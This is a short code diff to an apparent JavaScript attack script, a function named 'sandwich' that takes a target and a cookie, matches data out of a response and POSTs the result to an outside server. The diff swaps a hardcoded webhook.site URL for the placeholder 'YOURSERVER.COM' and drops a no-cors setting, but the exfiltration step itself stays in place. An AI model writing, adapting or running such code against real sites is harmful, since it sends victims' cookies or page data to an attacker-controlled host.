@@ -26,9 +26,8 @@ async function sandwich(target, cookie) {
             var result = responseData.match(regexf);
             const resultado = result.join(" ")
             // Step 4: Alert respone
-            const x2 = await fetch("https://webhook.site/b46cfbc2-09d0-4b4c-9800-f3b46a308f0a", {
+            const x2 = await fetch("YOURSERVER.COM", {
               method: "POST",
-              mode: 'no-cors',
               headers: {
                 "Content-Type": "application/json"
               },
